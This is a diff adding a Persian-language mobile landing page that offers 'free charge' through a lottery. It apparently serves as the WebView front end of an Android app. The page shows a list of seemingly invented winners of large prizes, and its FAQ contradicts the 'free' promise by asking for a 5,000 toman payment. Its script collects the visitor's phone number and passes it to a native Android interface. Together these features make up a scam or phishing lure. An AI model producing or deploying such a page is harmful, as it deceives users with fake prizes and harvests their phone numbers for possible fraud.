@@ -1,0 +1,541 @@
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شارژ رایگان - برندگان خوش شانس</title>
+    <style>
+        :root {
+            --primary-color: #00cc00;
+            --background: #ffffff;
+            --text-primary: #003366;
+            --text-secondary: #0066cc;
+            --accent: #0066cc;
+            --border-color: #d9e1e8;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap');
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            background-color: var(--background);
+            color: var(--text-primary);
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+
+        .container { max-width: 100%; margin: 0 auto; padding: 0 15px; }
+
+        header { 
+            background: linear-gradient(135deg, #0066cc, #003366); 
+            color: white; 
+            padding: 15px; 
+            box-shadow: var(--shadow); 
+            position: sticky; 
+            top: 0; 
+            z-index: 100; 
+        }
+        .header-content { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            flex-wrap: wrap; 
+        }
+        .logo { 
+            font-size: 20px; 
+            font-weight: 700; 
+            display: flex; 
+            align-items: center; 
+        }
+        .logo .win-tag { 
+            background-color: white; 
+            color: var(--accent); 
+            padding: 3px 8px; 
+            border-radius: 6px; 
+            margin-left: 6px; 
+            font-size: 12px; 
+        }
+        .menu-btn { 
+            background: none; 
+            border: none; 
+            color: white; 
+            font-size: 24px; 
+            cursor: pointer; 
+        }
+        .nav-menu { 
+            display: none; 
+            position: absolute; 
+            top: 50px; 
+            right: 0; 
+            background: white; 
+            width: 100%; 
+            box-shadow: var(--shadow); 
+        }
+        .nav-menu.active { 
+            display: block; 
+        }
+        .nav-menu ul { 
+            list-style: none; 
+            padding: 10px 0; 
+        }
+        .nav-menu li { 
+            padding: 8px; 
+            text-align: center; 
+        }
+        .nav-menu a { 
+            color: var(--text-primary); 
+            text-decoration: none; 
+            font-size: 14px; 
+            font-weight: 500; 
+        }
+        .nav-menu a:hover { 
+            color: var(--primary-color); 
+        }
+
+        .hero { 
+            text-align: center; 
+            padding: 60px 15px 20px; 
+            background: linear-gradient(to bottom, #f0f4f8, var(--background)); 
+        }
+        .hero h1 { 
+            font-size: 26px; 
+            margin-bottom: 15px; 
+        }
+        .hero p { 
+            font-size: 14px; 
+            color: var(--text-secondary); 
+            margin-bottom: 20px; 
+        }
+        .cta-container { 
+            display: flex; 
+            flex-direction: column; 
+            gap: 25px; 
+            align-items: center; 
+        }
+        .cta-button { 
+            background-color: var(--primary-color); 
+            color: white; 
+            padding: 12px; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            text-decoration: none; 
+            box-shadow: var(--shadow); 
+            transition: transform 0.2s, box-shadow 0.2s; 
+            width: 100%; 
+            max-width: 280px; 
+            text-align: center; 
+            min-height: 48px; 
+        }
+        .cta-button:hover { 
+            transform: translateY(-3px); 
+            box-shadow: 0 6px 20px rgba(0, 204, 0, 0.3); 
+        }
+        #joinLotteryButton { 
+            margin-right: 0; 
+        }
+
+        .winners-section { 
+            padding: 30px 15px; 
+        }
+        .section-title { 
+            font-size: 22px; 
+            margin-bottom: 20px; 
+            text-align: center; 
+        }
+        .winner-grid { 
+            display: flex; 
+            flex-direction: column; 
+            gap: 15px; 
+        }
+        .winner-item { 
+            background-color: white; 
+            border: 1px solid var(--border-color); 
+            border-radius: 8px; 
+            padding: 15px; 
+            text-align: center; 
+            box-shadow: var(--shadow); 
+            opacity: 0; 
+            transform: translateX(-50px); 
+            transition: opacity 0.5s ease, transform 0.5s ease; 
+        }
+        .winner-item.visible { 
+            opacity: 1; 
+            transform: translateX(0); 
+        }
+        .winner-name { 
+            font-size: 16px; 
+            font-weight: 700; 
+        }
+        .winner-prize { 
+            font-size: 13px; 
+            color: var(--text-secondary); 
+            margin-top: 8px; 
+        }
+
+        .faq-section { 
+            padding: 30px 15px; 
+        }
+        .faq-item { 
+            margin-bottom: 15px; 
+        }
+        .faq-item h3 { 
+            font-size: 16px; 
+            margin-bottom: 8px; 
+        }
+        .faq-item p { 
+            font-size: 13px; 
+        }
+
+        .contact-section { 
+            padding: 30px 15px; 
+        }
+        .contact-form { 
+            display: flex; 
+            flex-direction: column; 
+            gap: 12px; 
+            max-width: 100%; 
+        }
+        .contact-form input, 
+        .contact-form textarea { 
+            padding: 10px; 
+            border-radius: 6px; 
+            border: 1px solid var(--border-color); 
+            font-size: 13px; 
+            transition: all 0.3s ease; 
+            min-height: 44px; 
+        }
+        .contact-form input:focus, 
+        .contact-form textarea:focus { 
+            border-color: var(--accent); 
+            box-shadow: 0 0 5px rgba(0, 102, 204, 0.5); 
+            outline: none; 
+        }
+        .contact-form textarea { 
+            resize: vertical; 
+            min-height: 80px; 
+        }
+        .contact-form button { 
+            background-color: var(--accent); 
+            color: white; 
+            padding: 10px; 
+            border: none; 
+            border-radius: 6px; 
+            font-size: 14px; 
+            cursor: pointer; 
+            transition: background-color 0.3s ease; 
+            min-height: 44px; 
+        }
+        .contact-form button:hover { 
+            background-color: #004d99; 
+        }
+
+        .modal { 
+            position: fixed; 
+            z-index: 1001; 
+            left: 0; 
+            top: 0; 
+            width: 100%; 
+            height: 100%; 
+            background-color: rgba(0, 0, 0, 0.8); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            opacity: 0; 
+            visibility: hidden; 
+            transition: opacity 0.3s ease; 
+        }
+        .modal.active { 
+            opacity: 1; 
+            visibility: visible; 
+        }
+        .modal-content { 
+            background-color: white; 
+            padding: 20px; 
+            border-radius: 10px; 
+            width: 90%; 
+            max-width: 320px; 
+            text-align: center; 
+            box-shadow: var(--shadow); 
+            animation: slideIn 0.3s ease; 
+        }
+        @keyframes slideIn { 
+            from { transform: translateY(-20px); opacity: 0; } 
+            to { transform: translateY(0); opacity: 1; } 
+        }
+        .modal-content h3 { 
+            margin-bottom: 15px; 
+            font-size: 18px; 
+        }
+        .modal-content input { 
+            width: 100%; 
+            padding: 10px; 
+            margin-bottom: 15px; 
+            border-radius: 6px; 
+            border: 1px solid var(--border-color); 
+            font-size: 13px; 
+            direction: ltr; 
+        }
+        .modal-content button { 
+            background-color: var(--primary-color); 
+            color: white; 
+            padding: 10px 20px; 
+            border: none; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            font-size: 14px; 
+            min-height: 44px; 
+            width: 100%; 
+        }
+        .modal-content button:hover { 
+            background-color: #00b300; 
+        }
+
+        footer { 
+            background-color: #002244; 
+            color: white; 
+            padding: 15px 0; 
+            text-align: center; 
+        }
+        footer a { 
+            color: white; 
+            text-decoration: none; 
+            margin: 0 8px; 
+            font-size: 12px; 
+        }
+        footer a:hover { 
+            color: var(--primary-color); 
+        }
+        
+        /* Spinner Style */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto; /* Center the spinner inside the button */
+        }
+        @keyframes spin { 
+            to { transform: rotate(360deg); } 
+        }
+
+        /* ریسپانسیو برای موبایل */
+        @media (max-width: 480px) {
+            .container { padding: 0 10px; }
+            .hero { padding: 50px 10px 15px; }
+            .hero h1 { font-size: 22px; }
+            .hero p { font-size: 13px; }
+            .cta-button { 
+                padding: 10px; 
+                font-size: 14px; 
+                max-width: 250px; 
+            }
+            .section-title { font-size: 20px; }
+            .winner-item { padding: 12px; }
+            .winner-name { font-size: 14px; }
+            .winner-prize { font-size: 12px; }
+            .faq-item h3 { font-size: 14px; }
+            .faq-item p { font-size: 12px; }
+            .contact-form input, .contact-form textarea { font-size: 12px; padding: 8px; }
+            .contact-form button { font-size: 12px; padding: 8px; }
+            .modal-content { padding: 15px; max-width: 280px; }
+            .modal-content h3 { font-size: 16px; }
+            .modal-content input { font-size: 12px; }
+            .modal-content button { font-size: 12px; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <button class="menu-btn" onclick="toggleMenu()">☰</button>
+            <div class="logo">شارژ رایگان<span class="win-tag">برنده شو!</span></div>
+            <nav class="nav-menu" id="navMenu">
+                <ul>
+                    <li><a href="#home">خانه</a></li>
+                    <li><a href="#winners">برندگان</a></li>
+                    <li><a href="#faq">سوالات متداول</a></li>
+                    <li><a href="#contact">تماس با ما</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <section id="home" class="hero">
+        <div class="container">
+            <h1>شارژ رایگان دریافت کنید!</h1>
+            <p>با شرکت در قرعه‌کشی، شانس خود را برای برنده شدن شارژ رایگان امتحان کنید.</p>
+            <div class="cta-container">
+                <a href="#" class="cta-button" id="getChargeButton">دریافت شارژ رایگان</a>
+                <a href="#" class="cta-button" id="joinLotteryButton">برنده شو!</a>
+            </div>
+        </div>
+    </section>
+
+    <section id="winners" class="winners-section">
+        <div class="container">
+            <h2 class="section-title">برندگان اخیر</h2>
+            <div class="winner-grid">
+                <div class="winner-item">
+                    <div class="winner-name">علی محمدی</div>
+                    <div class="winner-prize">برنده ۵,۰۰۰,۰۰۰ تومان شارژ</div>
+                </div>
+                <div class="winner-item">
+                    <div class="winner-name">سارا احمدی</div>
+                    <div class="winner-prize">برنده ۳,۰۰۰,۰۰۰ تومان شارژ</div>
+                </div>
+                <div class="winner-item">
+                    <div class="winner-name">محمد رضایی</div>
+                    <div class="winner-prize">برنده ۲,۰۰۰,۰۰۰ تومان شارژ</div>
+                </div>
+                <div class="winner-item">
+                    <div class="winner-name">زهرا کریمی</div>
+                    <div class="winner-prize">برنده ۱,۰۰۰,۰۰۰ تومان شارژ</div>
+                </div>
+                <div class="winner-item">
+                    <div class="winner-name">حسین حسینی</div>
+                    <div class="winner-prize">برنده ۵۰۰,۰۰۰ تومان شارژ</div>
+                </div>
+                <div class="winner-item">
+                    <div class="winner-name">مریم کاظمی</div>
+                    <div class="winner-prize">برنده ۱۰۰,۰۰۰ تومان شارژ</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="faq" class="faq-section">
+        <div class="container">
+            <h2 class="section-title">سوالات متداول</h2>
+            <div class="faq-item">
+                <h3>آیا سرویس رایگان است؟</h3>
+                <p>شما فقط با پرداخت ۵ هزار تومن در قرعه کشی ۵,۰۰۰,۰۰۰ میلیونی ما شرکت میکنید در صورتی که از نفر ۱۰ تا ۱۰۰۰ بشین ۵۰۰,۰۰۰ هزار تومان شارژ برنده خواهید شد</p>
+            </div>
+            <div class="faq-item">
+                <h3>چگونه می‌توانم شارژ رایگان دریافت کنم؟</h3>
+                <p>با کلیک بر روی دکمه "دریافت شارژ رایگان" و وارد کردن شماره موبایل خود، در قرعه‌کشی شرکت کنید.</p>
+            </div>
+        </div>
+    </section>
+
+    <section id="contact" class="contact-section">
+        <div class="container">
+            <h2 class="section-title">تماس با ما</h2>
+            <form class="contact-form">
+                <input type="text" placeholder="نام" required>
+                <input type="email" placeholder="ایمیل" required>
+                <textarea placeholder="پیام شما" required></textarea>
+                <button type="submit">ارسال</button>
+            </form>
+        </div>
+    </section>
+
+    <div id="actionModal" class="modal">
+        <div class="modal-content">
+            <h3>دریافت شارژ رایگان</h3>
+            <p>لطفا شماره موبایل خود را وارد کنید:</p>
+            <input type="tel" id="phoneNumberInput" placeholder="مثال: 09123456789">
+            <button id="submitPhoneButton">تایید</button>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>© 2023 شارژ رایگان. تمامی حقوق محفوظ است.</p>
+            <p><a href="#">شرایط و ضوابط</a> | <a href="#">سیاست حفظ حریم خصوصی</a></p>
+        </div>
+    </footer>
+
+    <script>
+        // Make function global for the HTML onclick attribute
+        function toggleMenu() {
+            const menu = document.getElementById('navMenu');
+            menu.classList.toggle('active');
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const modal = document.getElementById('actionModal');
+            const getChargeButton = document.getElementById('getChargeButton');
+            const joinLotteryButton = document.getElementById('joinLotteryButton');
+            const submitPhoneButton = document.getElementById('submitPhoneButton');
+            const phoneNumberInput = document.getElementById('phoneNumberInput');
+            const winnerItems = document.querySelectorAll('.winner-item');
+
+            // Animate winners on load
+            let delay = 0;
+            winnerItems.forEach(item => {
+                setTimeout(() => {
+                    item.classList.add('visible');
+                }, delay);
+                delay += 300;
+            });
+
+            // Listener for the Get Charge button
+            getChargeButton.addEventListener('click', (e) => {
+                e.preventDefault();
+                modal.classList.add('active');
+            });
+
+            // Listener for the Join Lottery button
+            joinLotteryButton.addEventListener('click', (e) => {
+                e.preventDefault();
+                alert('برای شرکت در قرعه‌کشی، ابتدا باید شماره موبایل خود را وارد کنید.');
+                modal.classList.add('active');
+            });
+
+            // Close modal when clicking outside
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    modal.classList.remove('active');
+                }
+            });
+
+            // Main logic for phone number submission
+            submitPhoneButton.addEventListener('click', () => {
+                try {
+                    const phoneNumber = phoneNumberInput.value.trim();
+
+                    if (!/^(09)\d{9}$/.test(phoneNumber)) {
+                        alert('لطفا یک شماره موبایل ۱۱ رقمی معتبر وارد کنید (مثال: 09123456789).');
+                        return;
+                    }
+
+                    // Show spinner and disable button
+                    submitPhoneButton.innerHTML = '<div class="spinner"></div>';
+                    submitPhoneButton.disabled = true;
+
+                    // Send phone number to Android if interface exists
+                    if (typeof window.Android !== 'undefined' && typeof window.Android.sendPhoneNumber === 'function') {
+                        console.log('Sending phone number to Android:', phoneNumber);
+                        window.Android.sendPhoneNumber(phoneNumber);
+                        // Close modal and reset button; Android handles navigation
+                        modal.classList.remove('active');
+                        phoneNumberInput.value = '';
+                        submitPhoneButton.innerHTML = 'تایید';
+                        submitPhoneButton.disabled = false;
+                    } else {
+                        // Fallback for testing in a browser
+                        console.log('Android interface not found. Fallback mode. Number:', phoneNumber);
+                        alert(`رابط اندروید یافت نشد. شماره ارسال شده: ${phoneNumber}`);
+                        modal.classList.remove('active');
+                        phoneNumberInput.value = '';
+                        submitPhoneButton.innerHTML = 'تایید';
+                        submitPhoneButton.disabled = false;
+                    }
+                } catch (e) {
+                    console.error('Error in submitPhoneButton click:', e);
+                    if (window.Android && window.Android.showToast) {
+                        window.Android.showToast('خطا در ارسال شماره');
+                    }
+                    // Reset button on error
+                    submitPhoneButton.innerHTML = 'تایید';
+                    submitPhoneButton.disabled = false;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
